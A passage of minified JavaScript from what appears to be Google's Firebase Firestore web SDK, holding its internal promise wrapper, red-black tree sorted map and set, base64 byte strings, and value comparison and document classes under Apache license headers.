 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class re{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e(t=>{this.isDone=!0,this.result=t,this.nextCallback&&this.nextCallback(t)},t=>{this.isDone=!0,this.error=t,this.catchCallback&&this.catchCallback(t)})}catch(e){return this.next(void 0,e)}next(e,t){return this.callbackAttached&&Ne(),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(t,this.error):this.wrapSuccess(e,this.result):new re((r,i)=>{this.nextCallback=s=>{this.wrapSuccess(e,s).next(r,i)},this.catchCallback=s=>{this.wrapFailure(t,s).next(r,i)}})}toPromise(){return new Promise((e,t)=>{this.next(e,t)})}wrapUserFunction(e){try{const t=e();return t instanceof re?t:re.resolve(t)}catch(t){return re.reject(t)}}wrapSuccess(e,t){return e?this.wrapUserFunction(()=>e(t)):re.resolve(t)}wrapFailure(e,t){return e?this.wrapUserFunction(()=>e(t)):re.reject(t)}static resolve(e){return new re((t,r)=>{t(e)})}static reject(e){return new re((t,r)=>{r(e)})}static waitFor(e){return new re((t,r)=>{let i=0,s=0,o=!1;e.forEach(a=>{++i,a.next(()=>{++s,o&&s===i&&t()},l=>r(l))}),o=!0,s===i&&t()})}static or(e){let t=re.resolve(!1);for(const r of e)t=t.next(i=>i?re.resolve(i):r());return t}static forEach(e,t){const r=[];return e.forEach((i,s)=>{r.push(t.call(this,i,s))}),this.waitFor(r)}static mapArray(e,t){return new re((r,i)=>{const s=e.length,o=new Array(s);let a=0;for(let l=0;l<s;l++){const u=l;t(e[u]).next(h=>{o[u]=h,++a,a===s&&r(o)},h=>i(h))}})}static doWhile(e,t){return new re((r,i)=>{const s=()=>{e()===!0?t().next(()=>{s()},i):r()};s()})}}function BV(n){const e=n.match(/Android ([\d.]+)/i),t=e?e[1].split(".").slice(0,2).join("."):"-1";return Number(t)}function gc(n){return n.name==="IndexedDbTransactionError"}/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Yp{constructor(e,t){this.previousValue=e,t&&(t.sequenceNumberHandler=r=>this.oe(r),this._e=r=>t.writeSequenceNumber(r))}oe(e){return this.previousValue=Math.max(e,this.previousValue),this.previousValue}next(){const e=++this.previousValue;return this._e&&this._e(e),e}}Yp.ae=-1;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Dv=-1;function Zp(n){return n==null}function Wd(n){return n===0&&1/n==-1/0}function UV(n){return typeof n=="number"&&Number.isInteger(n)&&!Wd(n)&&n<=Number.MAX_SAFE_INTEGER&&n>=Number.MIN_SAFE_INTEGER}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const hk="";function jV(n){let e="";for(let t=0;t<n.length;t++)e.length>0&&(e=FI(e)),e=VV(n.get(t),e);return FI(e)}function VV(n,e){let t=e;const r=n.length;for(let i=0;i<r;i++){const s=n.charAt(i);switch(s){case"\0":t+="";break;case hk:t+="";break;default:t+=s}}return t}function FI(n){return n+hk+""}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function zI(n){let e=0;for(const t in n)Object.prototype.hasOwnProperty.call(n,t)&&e++;return e}function xo(n,e){for(const t in n)Object.prototype.hasOwnProperty.call(n,t)&&e(t,n[t])}function fk(n){for(const e in n)if(Object.prototype.hasOwnProperty.call(n,e))return!1;return!0}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Qt{constructor(e,t){this.comparator=e,this.root=t||On.EMPTY}insert(e,t){return new Qt(this.comparator,this.root.insert(e,t,this.comparator).copy(null,null,On.BLACK,null,null))}remove(e){return new Qt(this.comparator,this.root.remove(e,this.comparator).copy(null,null,On.BLACK,null,null))}get(e){let t=this.root;for(;!t.isEmpty();){const r=this.comparator(e,t.key);if(r===0)return t.value;r<0?t=t.left:r>0&&(t=t.right)}return null}indexOf(e){let t=0,r=this.root;for(;!r.isEmpty();){const i=this.comparator(e,r.key);if(i===0)return t+r.left.size;i<0?r=r.left:(t+=r.left.size+1,r=r.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal((t,r)=>(e(t,r),!1))}toString(){const e=[];return this.inorderTraversal((t,r)=>(e.push(`${t}:${r}`),!1)),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new mf(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new mf(this.root,e,this.comparator,!1)}getReverseIterator(){return new mf(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new mf(this.root,e,this.comparator,!0)}}class mf{constructor(e,t,r,i){this.isReverse=i,this.nodeStack=[];let s=1;for(;!e.isEmpty();)if(s=t?r(e.key,t):1,t&&i&&(s*=-1),s<0)e=this.isReverse?e.left:e.right;else{if(s===0){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop();const t={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return t}hasNext(){return this.nodeStack.length>0}peek(){if(this.nodeStack.length===0)return null;const e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}}class On{constructor(e,t,r,i,s){this.key=e,this.value=t,this.color=r??On.RED,this.left=i??On.EMPTY,this.right=s??On.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,t,r,i,s){return new On(e??this.key,t??this.value,r??this.color,i??this.left,s??this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,t,r){let i=this;const s=r(e,i.key);return i=s<0?i.copy(null,null,null,i.left.insert(e,t,r),null):s===0?i.copy(null,t,null,null,null):i.copy(null,null,null,null,i.right.insert(e,t,r)),i.fixUp()}removeMin(){if(this.left.isEmpty())return On.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),e=e.copy(null,null,null,e.left.removeMin(),null),e.fixUp()}remove(e,t){let r,i=this;if(t(e,i.key)<0)i.left.isEmpty()||i.left.isRed()||i.left.left.isRed()||(i=i.moveRedLeft()),i=i.copy(null,null,null,i.left.remove(e,t),null);else{if(i.left.isRed()&&(i=i.rotateRight()),i.right.isEmpty()||i.right.isRed()||i.right.left.isRed()||(i=i.moveRedRight()),t(e,i.key)===0){if(i.right.isEmpty())return On.EMPTY;r=i.right.min(),i=i.copy(r.key,r.value,null,null,i.right.removeMin())}i=i.copy(null,null,null,null,i.right.remove(e,t))}return i.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=e.copy(null,null,null,null,e.right.rotateRight()),e=e.rotateLeft(),e=e.colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=e.rotateRight(),e=e.colorFlip()),e}rotateLeft(){const e=this.copy(null,null,On.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){const e=this.copy(null,null,On.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){const e=this.left.copy(null,null,!this.left.color,null,null),t=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,t)}checkMaxDepth(){const e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed()||this.right.isRed())throw Ne();const e=this.left.check();if(e!==this.right.check())throw Ne();return e+(this.isRed()?0:1)}}On.EMPTY=null,On.RED=!0,On.BLACK=!1;On.EMPTY=new class{constructor(){this.size=0}get key(){throw Ne()}get value(){throw Ne()}get color(){throw Ne()}get left(){throw Ne()}get right(){throw Ne()}copy(e,t,r,i,s){return this}insert(e,t,r){return new On(e,t)}remove(e,t){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wn{constructor(e){this.comparator=e,this.data=new Qt(this.comparator)}has(e){return this.data.get(e)!==null}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal((t,r)=>(e(t),!1))}forEachInRange(e,t){const r=this.data.getIteratorFrom(e[0]);for(;r.hasNext();){const i=r.getNext();if(this.comparator(i.key,e[1])>=0)return;t(i.key)}}forEachWhile(e,t){let r;for(r=t!==void 0?this.data.getIteratorFrom(t):this.data.getIterator();r.hasNext();)if(!e(r.getNext().key))return}firstAfterOrEqual(e){const t=this.data.getIteratorFrom(e);return t.hasNext()?t.getNext().key:null}getIterator(){return new WI(this.data.getIterator())}getIteratorFrom(e){return new WI(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let t=this;return t.size<e.size&&(t=e,e=this),e.forEach(r=>{t=t.add(r)}),t}isEqual(e){if(!(e instanceof wn)||this.size!==e.size)return!1;const t=this.data.getIterator(),r=e.data.getIterator();for(;t.hasNext();){const i=t.getNext().key,s=r.getNext().key;if(this.comparator(i,s)!==0)return!1}return!0}toArray(){const e=[];return this.forEach(t=>{e.push(t)}),e}toString(){const e=[];return this.forEach(t=>e.push(t)),"SortedSet("+e.toString()+")"}copy(e){const t=new wn(this.comparator);return t.data=e,t}}class WI{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Rr{constructor(e){this.fields=e,e.sort(Un.comparator)}static empty(){return new Rr([])}unionWith(e){let t=new wn(Un.comparator);for(const r of this.fields)t=t.add(r);for(const r of e)t=t.add(r);return new Rr(t.toArray())}covers(e){for(const t of this.fields)if(t.isPrefixOf(e))return!0;return!1}isEqual(e){return Gl(this.fields,e.fields,(t,r)=>t.isEqual(r))}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class dk extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fn{constructor(e){this.binaryString=e}static fromBase64String(e){const t=function(i){try{return atob(i)}catch(s){throw typeof DOMException<"u"&&s instanceof DOMException?new dk("Invalid base64 string: "+s):s}}(e);return new Fn(t)}static fromUint8Array(e){const t=function(i){let s="";for(let o=0;o<i.length;++o)s+=String.fromCharCode(i[o]);return s}(e);return new Fn(t)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return function(t){return btoa(t)}(this.binaryString)}toUint8Array(){return function(t){const r=new Uint8Array(t.length);for(let i=0;i<t.length;i++)r[i]=t.charCodeAt(i);return r}(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return $e(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}}Fn.EMPTY_BYTE_STRING=new Fn("");const FV=new RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function mo(n){if(st(!!n),typeof n=="string"){let e=0;const t=FV.exec(n);if(st(!!t),t[1]){let i=t[1];i=(i+"000000000").substr(0,9),e=Number(i)}const r=new Date(n);return{seconds:Math.floor(r.getTime()/1e3),nanos:e}}return{seconds:nn(n.seconds),nanos:nn(n.nanos)}}function nn(n){return typeof n=="number"?n:typeof n=="string"?Number(n):0}function yo(n){return typeof n=="string"?Fn.fromBase64String(n):Fn.fromUint8Array(n)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const pk="server_timestamp",gk="__type__",mk="__previous_value__",yk="__local_write_time__";function Ov(n){var e,t;return((t=(((e=n==null?void 0:n.mapValue)===null||e===void 0?void 0:e.fields)||{})[gk])===null||t===void 0?void 0:t.stringValue)===pk}function Jp(n){const e=n.mapValue.fields[mk];return Ov(e)?Jp(e):e}function Zu(n){const e=mo(n.mapValue.fields[yk].timestampValue);return new yn(e.seconds,e.nanos)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zV{constructor(e,t,r,i,s,o,a,l,u){this.databaseId=e,this.appId=t,this.persistenceKey=r,this.host=i,this.ssl=s,this.forceLongPolling=o,this.autoDetectLongPolling=a,this.longPollingOptions=l,this.useFetchStreams=u}}const $d="(default)";class Ju{constructor(e,t){this.projectId=e,this.database=t||$d}static empty(){return new Ju("","")}get isDefaultDatabase(){return this.database===$d}isEqual(e){return e instanceof Ju&&e.projectId===this.projectId&&e.database===this.database}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wk="__type__",vk="__max__",yf={mapValue:{fields:{__type__:{stringValue:vk}}}},_k="__vector__",Hd="value";function wo(n){return"nullValue"in n?0:"booleanValue"in n?1:"integerValue"in n||"doubleValue"in n?2:"timestampValue"in n?3:"stringValue"in n?5:"bytesValue"in n?6:"referenceValue"in n?7:"geoPointValue"in n?8:"arrayValue"in n?9:"mapValue"in n?Ov(n)?4:$V(n)?9007199254740991:WV(n)?10:11:Ne()}function Pi(n,e){if(n===e)return!0;const t=wo(n);if(t!==wo(e))return!1;switch(t){case 0:case 9007199254740991:return!0;case 1:return n.booleanValue===e.booleanValue;case 4:return Zu(n).isEqual(Zu(e));case 3:return function(i,s){if(typeof i.timestampValue=="string"&&typeof s.timestampValue=="string"&&i.timestampValue.length===s.timestampValue.length)return i.timestampValue===s.timestampValue;const o=mo(i.timestampValue),a=mo(s.timestampValue);return o.seconds===a.seconds&&o.nanos===a.nanos}(n,e);case 5:return n.stringValue===e.stringValue;case 6:return function(i,s){return yo(i.bytesValue).isEqual(yo(s.bytesValue))}(n,e);case 7:return n.referenceValue===e.referenceValue;case 8:return function(i,s){return nn(i.geoPointValue.latitude)===nn(s.geoPointValue.latitude)&&nn(i.geoPointValue.longitude)===nn(s.geoPointValue.longitude)}(n,e);case 2:return function(i,s){if("integerValue"in i&&"integerValue"in s)return nn(i.integerValue)===nn(s.integerValue);if("doubleValue"in i&&"doubleValue"in s){const o=nn(i.doubleValue),a=nn(s.doubleValue);return o===a?Wd(o)===Wd(a):isNaN(o)&&isNaN(a)}return!1}(n,e);case 9:return Gl(n.arrayValue.values||[],e.arrayValue.values||[],Pi);case 10:case 11:return function(i,s){const o=i.mapValue.fields||{},a=s.mapValue.fields||{};if(zI(o)!==zI(a))return!1;for(const l in o)if(o.hasOwnProperty(l)&&(a[l]===void 0||!Pi(o[l],a[l])))return!1;return!0}(n,e);default:return Ne()}}function Xu(n,e){return(n.values||[]).find(t=>Pi(t,e))!==void 0}function Ql(n,e){if(n===e)return 0;const t=wo(n),r=wo(e);if(t!==r)return $e(t,r);switch(t){case 0:case 9007199254740991:return 0;case 1:return $e(n.booleanValue,e.booleanValue);case 2:return function(s,o){const a=nn(s.integerValue||s.doubleValue),l=nn(o.integerValue||o.doubleValue);return a<l?-1:a>l?1:a===l?0:isNaN(a)?isNaN(l)?0:-1:1}(n,e);case 3:return $I(n.timestampValue,e.timestampValue);case 4:return $I(Zu(n),Zu(e));case 5:return Ty(n.stringValue,e.stringValue);case 6:return function(s,o){const a=yo(s),l=yo(o);return a.compareTo(l)}(n.bytesValue,e.bytesValue);case 7:return function(s,o){const a=s.split("/"),l=o.split("/");for(let u=0;u<a.length&&u<l.length;u++){const h=$e(a[u],l[u]);if(h!==0)return h}return $e(a.length,l.length)}(n.referenceValue,e.referenceValue);case 8:return function(s,o){const a=$e(nn(s.latitude),nn(o.latitude));return a!==0?a:$e(nn(s.longitude),nn(o.longitude))}(n.geoPointValue,e.geoPointValue);case 9:return HI(n.arrayValue,e.arrayValue);case 10:return function(s,o){var a,l,u,h;const f=s.fields||{},p=o.fields||{},w=(a=f[Hd])===null||a===void 0?void 0:a.arrayValue,x=(l=p[Hd])===null||l===void 0?void 0:l.arrayValue,k=$e(((u=w==null?void 0:w.values)===null||u===void 0?void 0:u.length)||0,((h=x==null?void 0:x.values)===null||h===void 0?void 0:h.length)||0);return k!==0?k:HI(w,x)}(n.mapValue,e.mapValue);case 11:return function(s,o){if(s===yf.mapValue&&o===yf.mapValue)return 0;if(s===yf.mapValue)return 1;if(o===yf.mapValue)return-1;const a=s.fields||{},l=Object.keys(a),u=o.fields||{},h=Object.keys(u);l.sort(),h.sort();for(let f=0;f<l.length&&f<h.length;++f){const p=Ty(l[f],h[f]);if(p!==0)return p;const w=Ql(a[l[f]],u[h[f]]);if(w!==0)return w}return $e(l.length,h.length)}(n.mapValue,e.mapValue);default:throw Ne()}}function $I(n,e){if(typeof n=="string"&&typeof e=="string"&&n.length===e.length)return $e(n,e);const t=mo(n),r=mo(e),i=$e(t.seconds,r.seconds);return i!==0?i:$e(t.nanos,r.nanos)}function HI(n,e){const t=n.values||[],r=e.values||[];for(let i=0;i<t.length&&i<r.length;++i){const s=Ql(t[i],r[i]);if(s)return s}return $e(t.length,r.length)}function Yl(n){return Ay(n)}function Ay(n){return"nullValue"in n?"null":"booleanValue"in n?""+n.booleanValue:"integerValue"in n?""+n.integerValue:"doubleValue"in n?""+n.doubleValue:"timestampValue"in n?function(t){const r=mo(t);return`time(${r.seconds},${r.nanos})`}(n.timestampValue):"stringValue"in n?n.stringValue:"bytesValue"in n?function(t){return yo(t).toBase64()}(n.bytesValue):"referenceValue"in n?function(t){return Te.fromName(t).toString()}(n.referenceValue):"geoPointValue"in n?function(t){return`geo(${t.latitude},${t.longitude})`}(n.geoPointValue):"arrayValue"in n?function(t){let r="[",i=!0;for(const s of t.values||[])i?i=!1:r+=",",r+=Ay(s);return r+"]"}(n.arrayValue):"mapValue"in n?function(t){const r=Object.keys(t.fields||{}).sort();let i="{",s=!0;for(const o of r)s?s=!1:i+=",",i+=`${o}:${Ay(t.fields[o])}`;return i+"}"}(n.mapValue):Ne()}function $f(n){switch(wo(n)){case 0:case 1:return 4;case 2:return 8;case 3:case 8:return 16;case 4:const e=Jp(n);return e?16+$f(e):16;case 5:return 2*n.stringValue.length;case 6:return yo(n.bytesValue).approximateByteSize();case 7:return n.referenceValue.length;case 9:return function(r){return(r.values||[]).reduce((i,s)=>i+$f(s),0)}(n.arrayValue);case 10:case 11:return function(r){let i=0;return xo(r.fields,(s,o)=>{i+=s.length+$f(o)}),i}(n.mapValue);default:throw Ne()}}function qI(n,e){return{referenceValue:`projects/${n.projectId}/databases/${n.database}/documents/${e.path.canonicalString()}`}}function by(n){return!!n&&"integerValue"in n}function Bv(n){return!!n&&"arrayValue"in n}function KI(n){return!!n&&"nullValue"in n}function GI(n){return!!n&&"doubleValue"in n&&isNaN(Number(n.doubleValue))}function Hf(n){return!!n&&"mapValue"in n}function WV(n){var e,t;return((t=(((e=n==null?void 0:n.mapValue)===null||e===void 0?void 0:e.fields)||{})[wk])===null||t===void 0?void 0:t.stringValue)===_k}function gu(n){if(n.geoPointValue)return{geoPointValue:Object.assign({},n.geoPointValue)};if(n.timestampValue&&typeof n.timestampValue=="object")return{timestampValue:Object.assign({},n.timestampValue)};if(n.mapValue){const e={mapValue:{fields:{}}};return xo(n.mapValue.fields,(t,r)=>e.mapValue.fields[t]=gu(r)),e}if(n.arrayValue){const e={arrayValue:{values:[]}};for(let t=0;t<(n.arrayValue.values||[]).length;++t)e.arrayValue.values[t]=gu(n.arrayValue.values[t]);return e}return Object.assign({},n)}function $V(n){return(((n.mapValue||{}).fields||{}).__type__||{}).stringValue===vk}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class yr{constructor(e){this.value=e}static empty(){return new yr({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let t=this.value;for(let r=0;r<e.length-1;++r)if(t=(t.mapValue.fields||{})[e.get(r)],!Hf(t))return null;return t=(t.mapValue.fields||{})[e.lastSegment()],t||null}}set(e,t){this.getFieldsMap(e.popLast())[e.lastSegment()]=gu(t)}setAll(e){let t=Un.emptyPath(),r={},i=[];e.forEach((o,a)=>{if(!t.isImmediateParentOf(a)){const l=this.getFieldsMap(t);this.applyChanges(l,r,i),r={},i=[],t=a.popLast()}o?r[a.lastSegment()]=gu(o):i.push(a.lastSegment())});const s=this.getFieldsMap(t);this.applyChanges(s,r,i)}delete(e){const t=this.field(e.popLast());Hf(t)&&t.mapValue.fields&&delete t.mapValue.fields[e.lastSegment()]}isEqual(e){return Pi(this.value,e.value)}getFieldsMap(e){let t=this.value;t.mapValue.fields||(t.mapValue={fields:{}});for(let r=0;r<e.length;++r){let i=t.mapValue.fields[e.get(r)];Hf(i)&&i.mapValue.fields||(i={mapValue:{fields:{}}},t.mapValue.fields[e.get(r)]=i),t=i}return t.mapValue.fields}applyChanges(e,t,r){xo(t,(i,s)=>e[i]=s);for(const i of r)delete e[i]}clone(){return new yr(gu(this.value))}}function Ek(n){const e=[];return xo(n.fields,(t,r)=>{const i=new Un([t]);if(Hf(r)){const s=Ek(r.mapValue).fields;if(s.length===0)e.push(i);else for(const o of s)e.push(i.child(o))}else e.push(i)}),new Rr(e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class er{constructor(e,t,r,i,s,o,a){this.key=e,this.documentType=t,this.version=r,this.readTime=i,this.createTime=s,this.data=o,this.documentState=a}static newInvalidDocument(e){return new er(e,0,De.min(),De.min(),De.min(),yr.empty(),0)}static newFoundDocument(e,t,r,i){return new er(e,1,t,De.min(),r,i,0)}static newNoDocument(e,t){return new er(e,2,t,De.min(),De.min(),yr.empty(),0)}static newUnknownDocument(e,t){return new er(e,3,t,De.min(),De.min(),yr.empty(),2)}convertToFoundDocument(e,t){return!this.createTime.isEqual(De.min())||this.documentType!==2&&this.documentType!==0||(this.createTime=e),this.version=e,this.documentType=1,this.data=t,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=yr.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=yr.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=De.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return this.documentState===1}get hasCommittedMutations(){return this.documentState===2}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return this.documentType!==0}isFoundDocument(){return this.documentType===1}isNoDocument(){return this.documentType===2}isUnknownDocument(){return this.documentType===3}isEqual(e){return e instanceof er&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new er(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
